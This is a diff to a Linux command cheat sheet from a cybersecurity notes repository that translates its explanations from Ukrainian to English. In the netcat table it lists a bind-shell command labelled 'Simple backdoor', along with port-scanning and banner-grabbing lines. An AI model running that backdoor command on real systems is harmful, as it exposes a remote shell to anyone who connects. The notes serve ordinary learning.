@@ -2,7 +2,7 @@
 # Table of Contents
 ---
 
-- [Commands and Utilities](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B8-%D1%82%D0%B0-%D1%83%D1%82%D0%B8%D0%BB%D1%96%D1%82%D0%B8)
+- [Commands and Utilities](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#commands-and-utilities)
 	- [AWK](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#awk)
 	- [SUDO](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#sudo)
 	- [LESS](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#less)
@@ -23,11 +23,11 @@
 	- [SYSTEMCTL](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#systemctl)
 	- [NETCAT](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#netcat)
 	- [IP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ip)
-- [Theory](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#%D1%82%D0%B5%D0%BE%D1%80%D1%96%D1%8F)
-	- [Logical Operators](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#%D0%BB%D0%BE%D0%B3%D1%96%D1%87%D0%BD%D1%96-%D0%BE%D0%BF%D0%B5%D1%80%D0%B0%D1%82%D0%BE%D1%80%D0%B8)
-	- [SSH Tunneling](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ssh-%D1%82%D1%83%D0%BD%D0%B5%D0%BB%D1%8E%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F)
-	- [Access Rights](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#%D0%BF%D1%80%D0%B0%D0%B2%D0%B0-%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF%D1%83)
-	- [Data Streams, Redirects](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#%D0%BA%D0%B0%D0%BD%D0%B0%D0%BB%D0%B8-%D0%B7%D0%B2%D1%8F%D0%B7%D0%BA%D1%83-%D0%BF%D0%B5%D1%80%D0%B5%D0%BD%D0%B0%D0%BF%D1%80%D0%B0%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)
+- [Theory](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#theory)
+	- [Logical Operators](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#logical-operators)
+	- [SSH Tunneling](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#ssh-tunneling)
+	- [Access Rights](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#access-rights)
+	- [Data Streams, Redirects](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Linux%20Basics.md#data-streams-redirects)
 
 ---
 ---
@@ -79,9 +79,9 @@
 
 | Command | Explanation |
 | ------|-------|
-|`less -F` | Слідкувати за змінами в файлі| 
-|`less -X` |Лишити те що було в файлі без видалення після вимкнення команди|
-|`less -N` | Нумерувати рядки |
+|`less -F` | Monitor changes in the file| 
+|`less -X` |Leave what was in the file without deleting it after disabling the command|
+|`less -N` | Number lines |
 
 ---
 ## TAIL
@@ -92,10 +92,10 @@
 
 | Command | Explanation |
 | ------|-------|
-|`tail -50` | Скільки рядків треба з кінця взяти|
-|`tail +50` | Скільки рядків треба взяти з початку|
-|`tail -c` | Кількість байтів яку треба забрати з кінця|
-|`tail -F` | Моніторити зміни в файлі|
+|`tail -50` | Lines, need to be taken from the end|
+|`tail +50` | Lines, need to be taken from the beginning|
+|`tail -c` | Number of bytes to be removed from the end|
+|`tail -F` | Look for changes in a file|
 
 ---
 
@@ -107,9 +107,9 @@
 
 |Command|Explanation|
 |-|-|
-|`wget IP`| Завантажити файл з сайту|
-|`wget -O` | Зберегти файл під новим іменем|
-|`wget -i` | Завантажувати файл зі списку|
+|`wget IP`| Download the file from the site|
+|`wget -O` | Download the file under a new name|
+|`wget -i` | Download a file from the list|
 
 ---
 ## GREP
@@ -120,11 +120,11 @@
 
 |Command|Explanation|
 |-|-|
-|`grep "text" file.txt` | Найти текст в файлі|
-|`grep -i` | Пошук незалежно від регістра|
-|`grep "text" file1.txt file2.txt` | Пошук в двух файлах|
-|`grep -r "text" documents/ -e "*.txt"` | Пошук в каталозі documents виключно в файлах .txt|
-|`grep -r "text"` | Пошук в локальних директоріях і субдиректоріях|
+|`grep "text" file.txt` | Find text in a file|
+|`grep -i` | Search regardless of case|
+|`grep "text" file1.txt file2.txt` | Search in two files
+|`grep -r "text" documents/ -e "*.txt"` |Search in the documents directory only in .txt files|
+|`grep -r "text"` | Search in local directories and subdirectories|
 
 ---
 
@@ -137,8 +137,8 @@
 
 |Command|Explanation|
 |-|-|
-|`scp username@remote_server:/full/path/to/remote_file /local/path/to/local_directory/`|З віддаленого сервера на локальний|
-|`scp /local/path/to/local_file username@remote_server:/remote/path/to/destination/`|З локального сервера на віддалений|
+|`scp username@remote_server:/full/path/to/remote_file /local/path/to/local_directory/`|From remote to local|
+|`scp /local/path/to/local_file username@remote_server:/remote/path/to/destination/`|From local to remote|
 
 ---
 
@@ -149,111 +149,111 @@
 ---
 |Command|Explanation|
 |-|-|
-|`.`| Поточний каталог|
-|`./kek` | Відносний каталог|
-|`/home/carnifex17/kek` | Абсолютний шлях до каталогу|
-| `find ./GFG -perm 664` | Шукати в  директорії \.GFG файли з правами 664|
-|`-name` | Назва файлу|
-|`-type f` | Цей параметр вказує на пошук лише файлів (регулярних файлів).|
-|`-type d` | Він вказує на пошук лише каталогів.|
-|`find . -type f -mtime -3`| використовується для пошуку файлів за часом їхньої зміни (modification time) Змінений файл менше ніж 3 дня назад|
+|`.`| Current directory|
+|`./kek` | Relative directory|
+|`/home/carnifex17/kek` | Absolute path to the directory|
+| `find ./GFG -perm 664` | Search for files with permissions 664 in the \.GFG directory|
+|`-name` | File name|
+|`-type f` | This option specifies that only files are searched.|
+|`-type d` | Only directories are being searched.|
+|`find . -type f -mtime -3`| Гsed to search for files by their modification time The file was modified less than 3 days ago|
 
 ---
 ## PS
 
-**Програма для Linux яка створена для пошуку різних системних процесів**
+**A program for Linux that is designed to search for various system processes**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`ps aux` | Всі процеси |
-|`ps -p PID`| Доп інфа по PID|
-|`ps -u shrek` | Доп інфа по процесам від користувача **shrek**|
+|`ps aux` | All processes|
+|`ps -p PID`| Additional info about PID|
+|`ps -u shrek` | Additional info from **shrek** user|
 
 ---
 ## CHOWN
 
-**Command в операційній системі Linux, яка використовується для зміни власника або групи файлу або каталогу**
+**A command in the Linux operating system that is used to change the owner or group of a file or directory**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`chown owner_name file_name`| Змінити власника|
-|`chown :group1 file1.txt`|Змінити групу файлу|
-|`chown master:group1 file1.txt`| Змінити і те і те|
-|`chown --reference=greek1 greek2`| Змінити право власника з одного файлу на інший|
+|`chown owner_name file_name`| Change owner|
+|`chown :group1 file1.txt`|Change group of file|
+|`chown master:group1 file1.txt`| Change both|
+|`chown --reference=greek1 greek2`| Use greek1 rights as reference|
 
 ---
 ## NSLOOKUP
 
-**Command в операційній системі, яка використовується для виконання DNS-запитів і отримання інформації про доменні імена, IP-адреси та інші DNS-записи.**
+**An operating system command used to perform DNS queries and obtain information about domain names, IP addresses, and other DNS records.**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`nslookup -type=any` | Пошук всіх DNS записів |
-|`nslookup -type={type of dns recording}` |Пошук конкретного DNS запиту|
-|`A`, `MX`, `NS`, `TXT`, `SOA`, `AAAA`, `CNAME` |Типи DNS записів|
+|`nslookup -type=any` | List all available DNS records |
+|`nslookup -type={type of dns recording}` |Search for certain DNS record|
+|`A`, `MX`, `NS`, `TXT`, `SOA`, `AAAA`, `CNAME` |Types of DNS records|
 
 ---
 ## DIG
 
-**Command яка схожа по сенсу та функціоналу за nslookup**
+**Younger sibling of nslookup**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`dig site.com +short` | A запис|
-|`dig site.com +nocomments` |Без коментарів|
-|`dig site.com ANY` | Всі записи|
-|`dig site.com +trace` | Відслідкувати шлях DNS|
+|`dig site.com +short` | A record|
+|`dig site.com +nocomments` |No comments|
+|`dig site.com ANY` | All records|
+|`dig site.com +trace` | Trace DNS path|
 
 ---
 ## UNAME
 
-**Command в операційній системі Unix та подібних системах, яка виводить інформацію про систему та її ядро.**
+**A command in the Unix operating system and similar systems that displays information about the system and its kernel.**
 
 ---
 
 |Command|Explanation|
 |-|-|
-| `uname -a` |Вся системна інформація|
-| `uname -s`|Назва ядра|
-| `uname -r`|Дата релізу ядра|
+| `uname -a` |All system info|
+| `uname -s`|Kernel name|
+| `uname -r`|Kernel release date|
 
 ---
 
 ## UNIQ
 
-**Command яка видаляє стрічки, які повторюються**
+**Linux command which looks for repeatings strings and helps to manage them**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`uniq -c`| Рахує скільки раз повторюється|
-| `uniq -d`| Тільки виводить стрічки які повторювались|
-| `uniq -u` | Виводить унікальні стрічки|
+|`uniq -c`| Counts how many times it is repeated|
+| `uniq -d`| Only displays repeated feeds|
+| `uniq -u` | Displays unique feeds|
 
 ---
 
 ## SORT
 
-**Command Linux, яка сортує файли**
+**You will never guess what it does**
 
 ---
 
 |Command|Explanation|
 |-|-|
-| `sort -o outputfile.txt inputfile.txt` |Сортування з виводом у вказаний файл|
-| `sort -r`|Сортування по порядку навпаки|
-| `sort -n`|Сортування по числам|
-| `sort -nr`|Сортуванням по числам навпаки|
-| `sort -k 2n file.txt`|Сортування за другою колонкою числами|
+| `sort -o outputfile.txt inputfile.txt` |Sorting with output to a specified file|
+| `sort -r`|Sorting in reverse order|
+| `sort -n`|Sorting by numbers|
+| `sort -nr`|Sorting by numbers in reverse order|
+| `sort -k 2n file.txt`|Sort by second column by numbers|
 
 ---
 ## WHOIS
@@ -264,57 +264,57 @@
 
 |Command|Explanation|
 |-|-|
-|`whois site.com` | Вивід інформації за доменом|
-|`whois 125.8.888.200`| Вивід інформації за ІР адресою|
+|`whois site.com` | Displaying information by domain name|
+|`whois 125.8.888.200`| Displaying information by IP address|
 
 ---
 ## TAR
 
-**Command Linux, яка використовується для розархівування tar формату**
+**Linux command used to unzip tar format**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`tar -xvf file.tar`| Детальне розархівування|
+|`tar -xvf file.tar`| Detailed unzipping|
 
 ---
 ## SYSTEMCTL
 
-**Command Linux, яка використовується для контролю різноманітними сервісами**
+**Linux command to manage different services**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`sudo systemctl restart service`| Перезавантажити сервіс|
-|`sudo systemctl status service`|Провірити стан сервісу|
-|`sudo systemctl stop service`| Зупинити сервіс|
-|`sudo systemctl --type=service --state=running`| Перелік активних сервісів|
+|`sudo systemctl restart service`| Restart service|
+|`sudo systemctl status service`|Check service status|
+|`sudo systemctl stop service`|Stop service|
+|`sudo systemctl --type=service --state=running`|List active service|
 
 ---
 
 ## NETCAT
 
-**Універсальна утиліта для мережевого з'єднання в операційних системах Unix та подібних системах**
+**Universal utility for network connection in Unix and similar operating systems**
 
 ---
 
 |Command|Explanation|
 |-|-|
-|`nc host port`|Робить з'єднання до хоста на вказаний порт|
-|`nc -l -p port`|Запускає nc в режим слухання(listener) на вказаному порті|
-|`nc -z host {port-range}`|Базовий сканер портів|
-|`nc -v host port`|Дістати баннер|
-|`nc -l -p local_port -c 'nc remote_host remote_port'`|Налаштовує базовий проксі, коли він прослуховує певний локальний порт і пересилає його на віддалений сервер|
-|`nc -l -p 1234 -e /bin/bash`|Простий бекдор|
+|`nc host port`|Connects to the host on the specified port|
+|`nc -l -p port`|Starts nc in listener mode on the specified port|
+|`nc -z host {port-range}`|Basic port scanner|
+|`nc -v host port`|Get banner|
+|`nc -l -p local_port -c 'nc remote_host remote_port'`|Configures a basic proxy where it listens for a specific local port and forwards it to a remote server|
+|`nc -l -p 1234 -e /bin/bash`|Simple backdoor|
 
 ---
 
 
 ## IP
 
-**Command Linux для контролю ІР. Старіший аналог ifconfig**
+**Linux command to manage ІР. Older brother of ifconfig**
 
 ---
 
@@ -390,23 +390,23 @@ ssh -D local_socks_port username@remote_server
 
 ## Access Rights
 
-**У Linux є своя схема показу прав доступу за допомогою цифр, щоб було швидко і легко показати які права де. Кожні три цифри відповідають трьом правам доступу (читання, запис, виконання) для трьох різних категорій користувачів (власник, група, інші).
-Кожна з цих цифр може мати значення від 0 до 7, де кожне значення представляє собою комбінацію трьох можливих прав доступу:**
+**Linux has its own scheme for displaying access rights using numbers to make it quick and easy to show which rights are where. Each three digits corresponds to three access rights (read, write, execute) for three different categories of users (owner, group, other).
+Each of these digits can have a value from 0 to 7, where each value represents a combination of three possible access rights:**
 
->0 - Немає прав доступу (відсутність права).
->1 - Виконання (execute).
->2 - Запис (write).
->4 - Читання (read).
+>0 - (no rights).
+>1 - (execute).
+>2 - (write).
+>4 - (read).
 
 ---
 
 ### **File Rights**
 
-Для встановлення прав доступу за допомогою цифр, ви просто додаєте значення цифр для кожної категорії разом:
-Наприклад, `chmod 755 file.txt` встановлює такі права:
-1. Власник має права на читання, запис і виконання (4 + 2 + 1 = 7).
-2. Група має права на читання, виконання (4 + 1 = 5).
-3. Інші користувачі мають права на читання і виконання (4 + 1 = 5).
+To set permissions using numbers, you simply add the number values for each category together:
+For example, `chmod 755 file.txt' sets the following permissions:
+1. The owner has read, write, and execute permissions (4 + 2 + 1 = 7).
+2. Group has read and execute permissions (4 + 1 = 5).
+3. Other users have read and execute permissions (4 + 1 = 5).
 
 ---
 
